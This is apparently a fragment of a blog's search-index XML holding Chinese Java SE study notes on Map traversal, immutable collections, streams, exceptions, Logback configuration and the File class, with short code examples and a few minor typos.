<li><p>方式二：键值对</p>
<ul>
<li><p>先把 Map 集合转化为 Set 集合，Set 集合中的每个元素都是键值对实体类型了</p>
</li>
<li><p>遍历 Set 集合，然后提取键以及提取值</p>
</li>
<li><p>用到的方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code></td>
<td>获取所有键值对对象的集合</td>
</tr>
<tr>
<td><code>K getKey()</code></td>
<td>获得键</td>
</tr>
<tr>
<td><code>V getValue()</code></td>
<td>获取值</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String , Integer&gt; maps = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">maps.put(<span class="string">&quot;Poria&quot;</span>,<span class="number">100</span>);</span><br><span class="line">maps.put(<span class="string">&quot;Pupi1&quot;</span>,<span class="number">100</span>);</span><br><span class="line">Set&lt;Map.Entry&lt;String, Integer&gt;&gt; entries = maps.entrySet();</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, Integer&gt; entry : entries)&#123;</span><br><span class="line">  String key = entry.getKey();</span><br><span class="line">  <span class="keyword">int</span> value = entry.getValue();</span><br><span class="line">  System.out.println(key + <span class="string">&quot;====&gt;&quot;</span> + value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方式三：Lambda 表达式</p>
<ul>
<li><p>用到的方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>default void forEach(BiConsumer&lt;?  super  K,  ? super  V&gt;  action)</code></td>
<td>结合lambda遍历Map集合</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String , Integer&gt; maps = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">maps.put(<span class="string">&quot;Poria&quot;</span>,<span class="number">100</span>);</span><br><span class="line">maps.put(<span class="string">&quot;Pupi1&quot;</span>,<span class="number">100</span>);</span><br><span class="line">maps.forEach(<span class="keyword">new</span> BiConsumer&lt;String, Integer&gt;() &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(String key, Integer value)</span> </span>&#123;</span><br><span class="line">    System.out.println(key + <span class="string">&quot;---&gt;&quot;</span> + value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上代码可简化为</span></span><br><span class="line">maps.forEach((k, v) -&gt; System.out.println(k + <span class="string">&quot;---&gt;&quot;</span> + v));</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h5 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h5><ul>
<li>HashMap<ul>
<li>底层为哈希表结构</li>
<li>依赖 hashCode 方法和 equals 方法保证键的唯一</li>
</ul>
</li>
<li>LinkedHashMap<ul>
<li>底层依然是哈希表，但是额外多了一个双链表的机制记录存储的顺序</li>
</ul>
</li>
<li>TreeMap<ul>
<li>默认排序，只对键排序，基于红黑树实现</li>
</ul>
</li>
</ul>
<h4 id="不可变集合"><a href="#不可变集合" class="headerlink" title="不可变集合"></a>不可变集合</h4><h5 id="认识一下嘛-6"><a href="#认识一下嘛-6" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>如果某个数据不能被修改，就将它拷贝到不可变集合中</li>
<li>当集合对象被不可信的库调用时，不可变形式是安全的</li>
</ul>
<h5 id="常用方法-2"><a href="#常用方法-2" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li><p>在 List，Set，Map接口中都存在 of 方法，可以创建一个不可变的集合</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>static  &lt;E&gt; List&lt;E&gt; of(E…elements)</code></td>
<td>创建一个具有指定元素的List集合对象</td>
</tr>
<tr>
<td><code>static  &lt;E&gt; Set&lt;E&gt; of(E…elements)</code></td>
<td>创建一个具有指定元素的Set集合对象</td>
</tr>
<tr>
<td><code>static &lt;K  , V&gt;  Map&lt;K，V&gt; of(E…elements)</code></td>
<td>创建一个具有指定元素的Map集合对象</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之Stream流</title>
    <url>/2021/12/14/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8BStream%E6%B5%81/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（五）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="Stream-流概述"><a href="#Stream-流概述" class="headerlink" title="Stream 流概述"></a>Stream 流概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>得益于 Lambda 所带来的函数式编程，出现了 Stream 流的概念</li>
<li>用于简化集合和数组操作的 API</li>
</ul>
<h5 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h5><ul>
<li>先得到集合或者数组的 Stream 流</li>
<li>将元素放在上面</li>
<li>用 Stream 流简化的方式来方便的操作元素</li>
</ul>
<h5 id="流的三类方法"><a href="#流的三类方法" class="headerlink" title="流的三类方法"></a>流的三类方法</h5><ul>
<li>获取流：创建一条流水线，并把数据放在流水线上操作</li>
<li>中间方法：一次操作完成之后，还可以继续其他操作</li>
<li>终结方法：一个流只能有一个终结方法，是流水线上的最后一个操作</li>
</ul>
<h4 id="流的获取"><a href="#流的获取" class="headerlink" title="流的获取"></a>流的获取</h4><h5 id="集合获取流"><a href="#集合获取流" class="headerlink" title="集合获取流"></a>集合获取流</h5><ul>
<li><p>使用 Collection 接口中的默认方法</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>default  Stream&lt;E&gt; stream()</code></td>
<td>获取当前集合对象的Stream流</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Collection集合获取流</span></span><br><span class="line">Collection&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">Stream&lt;String&gt; s =  list.stream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Map集合获取流</span></span><br><span class="line">Map&lt;String, Integer&gt; maps = <span class="keyword">new</span> HashMap&lt;&gt;();							</span><br><span class="line">Stream&lt;String&gt; keyStream = maps.keySet().stream();	<span class="comment">// 键流		    </span></span><br><span class="line">Stream&lt;Integer&gt; valueStream = maps.values().stream();	<span class="comment">// 值流			</span></span><br><span class="line">Stream&lt;Map.Entry&lt;String,Integer&gt;&gt; keyAndValueStream =  maps.entrySet().stream();	<span class="comment">// 键值对流（拿整体）</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="数组获取流"><a href="#数组获取流" class="headerlink" title="数组获取流"></a>数组获取流</h5><ul>
<li><p>用到的方法</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  static &lt;T&gt;  Stream&lt;T&gt;  stream(T[]  array)</code></td>
<td>获取当前数组的Stream流</td>
</tr>
<tr>
<td><code>public  static&lt;T&gt;  Stream&lt;T&gt;  of(T...  values)</code></td>
<td>获取当前数组/可变数据的Stream流</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;Poria&quot;</span>,<span class="string">&quot;Pupi1&quot;</span>&#125;;</span><br><span class="line">Stream&lt;String&gt; nameStream1 = Arrays.stream(names);</span><br><span class="line">Stream&lt;String&gt; nameStream2 = Stream.of(names);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="流的中间方法"><a href="#流的中间方法" class="headerlink" title="流的中间方法"></a>流的中间方法</h4><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Stream&lt;T&gt;  filter(Predicate&lt;?  super  T&gt;  predicate)</code></td>
<td>用于对流中的数据进行<strong>过滤。</strong></td>
</tr>
<tr>
<td><code>Stream&lt;T&gt;  limit(long maxSize)</code></td>
<td>获取前几个元素</td>
</tr>
<tr>
<td><code>Stream&lt;T&gt;  skip(long n)</code></td>
<td>跳过前几个元素</td>
</tr>
<tr>
<td><code>Stream&lt;T&gt;  distinct()</code></td>
<td>去除流中重复的元素。依赖(hashCode和equals方法)</td>
</tr>
<tr>
<td><code>static  &lt;T&gt; Stream&lt;T&gt; concat(Stream  a, Stream b)</code></td>
<td><strong>合并</strong>a和b两个流为一个流</td>
</tr>
</tbody></table>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>中间方法也称非终结方法，调用完成之后返回新的流可以继续使用，支持链式编程</li>
<li>在流中无法直接修改集合、数组中的数据</li>
</ul>
<h4 id="流的终结方法"><a href="#流的终结方法" class="headerlink" title="流的终结方法"></a>流的终结方法</h4><h5 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>void  forEach(Consumer  action)</code></td>
<td>对此流的每个元素执行遍历操作</td>
</tr>
<tr>
<td><code>long count()</code></td>
<td>返回此流中的元素数</td>
</tr>
</tbody></table>
<h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>调用之后无法继续使用流了，因为这些方法不会返回流</li>
</ul>
<h4 id="流的收集"><a href="#流的收集" class="headerlink" title="流的收集"></a>流的收集</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>把流操作后的结果数据转回到集合或者数组中去</li>
<li>流只是方便操作集合/数组的<strong>手段</strong>，集合/数组才是开发中的<strong>目的</strong></li>
</ul>
<h5 id="收集方法"><a href="#收集方法" class="headerlink" title="收集方法"></a>收集方法</h5><table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>R collect(Collector collector)</code></td>
<td>开始收集Stream流，指定收集器</td>
</tr>
</tbody></table>
<p>Collectors 工具类中提供了具体的收集方法</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public static &lt;T&gt; Collector toList()</code></td>
<td>把元素收集到List集合中</td>
</tr>
<tr>
<td><code>public static &lt;T&gt; Collector toSet()</code></td>
<td>把元素收集到Set集合中</td>
</tr>
<tr>
<td><code>public static Collector toMap(Function keyMapper  , Function valueMapper)</code></td>
<td>把元素收集到Map集合中</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之异常与日志</title>
    <url>/2021/12/22/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E5%BC%82%E5%B8%B8%E4%B8%8E%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（六）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="异常概述"><a href="#异常概述" class="headerlink" title="异常概述"></a>异常概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>异常是程序在“编译”或“执行”过程中可能出现的问题</li>
<li>比如：数组索引越界，空指针异常，日期格式化异常，等</li>
<li>异常一旦出现，如果不处理，程序就会退出 JVM 虚拟机而终止</li>
<li>研究异常并且避免异常，然后提前处理异常，体现的是程序的安全，健壮性</li>
</ul>
<h5 id="体系"><a href="#体系" class="headerlink" title="体系"></a>体系</h5><ul>
<li>Error：系统级别的问题，JVM 退出等，代码无法控制</li>
<li>Exception：java.lang 包下，称为异常类，它表示程序本身可以处理的问题<ul>
<li>RuntimeException 及其子类：运行时异常，编译阶段不会报错（空指针异常，数组越界异常）</li>
<li>除了上面那个异常之外的所有异常：编译时报错，编译期必须处理（日期格式化异常）</li>
</ul>
</li>
</ul>
<h5 id="两种异常的说明"><a href="#两种异常的说明" class="headerlink" title="两种异常的说明"></a>两种异常的说明</h5><ul>
<li>编译时异常，是在编译成 class 文件时必须要处理的异常，也称之为受检异常</li>
<li>运行时异常，在编译成 class 文件时不需要处理，在运行字节码文件时可能出现的异常</li>
</ul>
<h4 id="默认处理流程"><a href="#默认处理流程" class="headerlink" title="默认处理流程"></a>默认处理流程</h4><h5 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h5><ol>
<li>默认会在出现异常的代码那里自动的创建一个异常对象</li>
<li>异常会从方法中出现的点这里抛出给调用者，调用者最终抛出给 JVM 虚拟机</li>
<li>虚拟机接到异常对象后，先在控制台直接输出异常栈信息</li>
<li>直接从当前执行的异常点结束掉当前程序</li>
<li>后续代码没有机会执行，因为程序已经死亡</li>
</ol>
<h5 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h5><ul>
<li>默认机制并不好，一旦程序出现异常，就立即死亡</li>
</ul>
<h4 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h4><h5 id="编译时异常"><a href="#编译时异常" class="headerlink" title="编译时异常"></a>编译时异常</h5><ul>
<li><p>方式一：throws</p>
<ul>
<li><p>用在方法上，可以将方法内部出现的异常抛出去给本方法的调用者处理</p>
</li>
<li><p>这种方式并不好，发生异常的方法自己不去处理异常，如果异常最终抛给虚拟机将引起程序死亡</p>
<p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法 <span class="keyword">throws</span> 异常<span class="number">1</span>，异常<span class="number">2</span>，异常<span class="number">3</span> ...&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐做法</span></span><br><span class="line">方法 <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">  <span class="comment">// 代表可以抛出一切异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方法二：try…catch…</p>
<ul>
<li><p>监视捕获异常，用在方法内部，可以将方法内部出现的异常直接捕获</p>
</li>
<li><p>这种方式较为常用，发生异常的方法自己独立完成异常的处理，程序可以继续往下执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="comment">// 监视可能出现异常的代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">1</span> 变量)&#123;</span><br><span class="line">  <span class="comment">// 处理异常</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">2</span> 变量)&#123;</span><br><span class="line">  <span class="comment">// 处理异常</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="comment">// 可能出现异常的代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  e.printStackTrace();	<span class="comment">// 直接打印异常栈信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方式三：前两者结合</p>
<ul>
<li><p>方法直接抛出异常给调用者</p>
</li>
<li><p>调用者收到异常后捕获处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    parseTime(<span class="string">&quot;2011-11-11 11:11:11&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;功能操作成功~~~&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    System.out.println(<span class="string">&quot;功能操作失败~~~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">parseTime</span><span class="params">(String date)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">  Date d = sdf.parse(date);</span><br><span class="line">  System.out.println(d);</span><br><span class="line">  InputStream is = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Poria.jpg&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>运行时异常的处理机制，建议使用方式三来处理</p>
</li>
</ul>
<h4 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h4><h5 id="必要性"><a href="#必要性" class="headerlink" title="必要性"></a>必要性</h5><ul>
<li>Java 无法为这个世界上全部的问题提供异常类</li>
<li>如果想通过异常的方式来管理自己的某个业务，就需要自定义异常类</li>
</ul>
<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul>
<li>自定义编译时异常<ul>
<li>定义一个异常类继承 Exception</li>
<li>重写构造器</li>
<li>在出现异常的地方用 throw new 自定义对象抛出</li>
</ul>
</li>
<li>自定义运行时异常<ul>
<li>定义一个异常类继承 RuntimeException</li>
<li>重写构造器</li>
<li>在出现异常的地方用 throw new 自定义对象抛出</li>
</ul>
</li>
</ul>
<h4 id="日志技术概述"><a href="#日志技术概述" class="headerlink" title="日志技术概述"></a>日志技术概述</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>用来记录程序运行过程中的信息，并且进行永久存储</li>
</ul>
<h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul>
<li>可以将系统执行的信息选择性的记录到指定的位置（控制台、文件中、数据库）</li>
<li>可以随时以开关的形式控制是否记录日志，无需修改源代码</li>
<li>多线程性能较好</li>
</ul>
<h4 id="体系-1"><a href="#体系-1" class="headerlink" title="体系"></a>体系</h4><h5 id="日志规范"><a href="#日志规范" class="headerlink" title="日志规范"></a>日志规范</h5><ul>
<li>一些接口，提供给日志的实现框架设计的标准</li>
<li>常见规范有<ul>
<li>Commons Logging 简称：<code>JCL</code></li>
<li>Simple Logging Facade For Java 简称：<code>slf4j</code></li>
</ul>
</li>
</ul>
<h5 id="日志框架"><a href="#日志框架" class="headerlink" title="日志框架"></a>日志框架</h5><ul>
<li>Log4j</li>
<li>JUL（java.util.logging）</li>
<li>Logback</li>
</ul>
<h4 id="Logback"><a href="#Logback" class="headerlink" title="Logback"></a>Logback</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>官网：<a href="https://logback.qos.ch/index.html">https://logback.qos.ch/index.html</a></li>
<li>Logback 是由 log4j 创始人设计的另一个开源日志组件，性能较好</li>
<li>基于 slf4j 实现</li>
</ul>
<h5 id="三个模块"><a href="#三个模块" class="headerlink" title="三个模块"></a>三个模块</h5><ul>
<li>logback-core：为其他两个模块奠定了基础</li>
<li>logback-classic：是 log4j 的一个改良版本，同时完整实现了 slf4j API</li>
<li>logback-access：与 Tomcat 和 Jetty 等 Serlvet 容器集成，以提供 HTTP 访问日志功能</li>
</ul>
<h5 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h5><ul>
<li>在项目下新建 lib 文件夹，导入 Logback 的相关 jar 包到该文件夹下，并添加到项目库中</li>
<li>必须将 Logback 的核心配置文件 logback.xml 直接拷贝到 src 目录下</li>
<li>在代码中获取日志的对象 ：<code>public static final Logger LOGGER = LoggerFactory.getLogger(&quot;类对象&quot;);</code></li>
<li>使用日志对象输出日志信息</li>
</ul>
<h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">&lt;!-- CONSOLE：表示当前的日志信息是可以输出到控制台的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 输出流对象 默认 System.out 改为 System.err --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>System.out<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度，%msg：日志消息，%n是换行符 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%-5level]  %c [%thread] : %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- File是输出的方向通向文件的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志输出路径--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>/var/log/poria<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定日志文件拆分和压缩规则--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span></span></span><br><span class="line"><span class="tag">                <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--通过指定压缩文件名称，来确定分割文件方式--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>C:/code/itheima-data2-%d&#123;yyyy-MM-dd&#125;.log%i.gz<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--文件拆分大小--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>1MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF 默认debug</span></span><br><span class="line"><span class="comment">    &lt;root&gt;可以包含零个或多个&lt;appender-ref&gt;元素，标识这个输出位置将会被本日志级别控制</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ALL&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 注意：如果这里不配置关联打印位置，该位置将不会记录日志--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之文件操作</title>
    <url>/2021/12/22/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（七）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="File-类概述"><a href="#File-类概述" class="headerlink" title="File 类概述"></a>File 类概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>该类在 java.io.File 下，代表操作系统的文件对象（文件、文件夹）</li>
<li>该类可以定位文件，获取文件信息，删除、创建文件（夹）；但是不能读写文件</li>
</ul>
<h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><ul>
<li>仅仅是一个路径名称，该路径可以存在，也可以不存在</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file = <span class="keyword">new</span> (<span class="string">&quot;pathname&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="绝对路径与相对路径"><a href="#绝对路径与相对路径" class="headerlink" title="绝对路径与相对路径"></a>绝对路径与相对路径</h5><ul>
<li><p>绝对路径：从盘符开始</p>
<p><code>File file = new File(&quot;D:/poria/poria.txt&quot;);</code></p>
</li>
<li><p>相对路径：不带盘符，默认直接到当前工程下寻找文件</p>
<p><code>File file = new File(&quot;模块名称/poria.txt&quot;);</code></p>
</li>
</ul>
<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><h5 id="判断文件类型、获取文件信息"><a href="#判断文件类型、获取文件信息" class="headerlink" title="判断文件类型、获取文件信息"></a>判断文件类型、获取文件信息</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  boolean isDirectory()</code></td>
<td>测试此抽象路径名表示的File是否为文件夹</td>
</tr>
<tr>
<td><code>public  boolean isFile()</code></td>
<td>测试此抽象路径名表示的File是否为文件</td>
</tr>
<tr>
<td><code>public  boolean  exists()</code></td>
<td>测试此抽象路径名表示的File是否存在</td>
</tr>
<tr>
<td><code>public  String getAbsolutePath()</code></td>
<td>返回此抽象路径名的绝对路径名字符串</td>
</tr>
<tr>
<td><code>public  String getPath()</code></td>
<td>将此抽象路径名转换为路径名字符串</td>
</tr>
<tr>
<td><code>public  String getName()</code></td>
<td>返回由此抽象路径名表示的文件或文件夹的名称</td>
</tr>
<tr>
<td><code>public  long lastModified()</code></td>
<td>返回文件最后修改的时间毫秒值</td>
</tr>
</tbody></table>
<h5 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public boolean createNewFile()</code></td>
<td>创建一个新的空的文件</td>
</tr>
<tr>
<td><code>public boolean mkdir()</code></td>
<td>只能创建一级文件夹</td>
</tr>
<tr>
<td><code>public boolean mkdirs()</code></td>
<td>可以创建多级文件夹</td>
</tr>
</tbody></table>
<h5 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  boolean delete()</code></td>
<td>删除由此抽象路径名表示的文件或空文件夹</td>
</tr>
</tbody></table>
<ul>
<li>delete 方法默认只能删除文件和空文件夹</li>
<li>该删除方法不走回收站</li>
</ul>
<h5 id="遍历文件夹"><a href="#遍历文件夹" class="headerlink" title="遍历文件夹"></a>遍历文件夹</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public String[] list()</code></td>
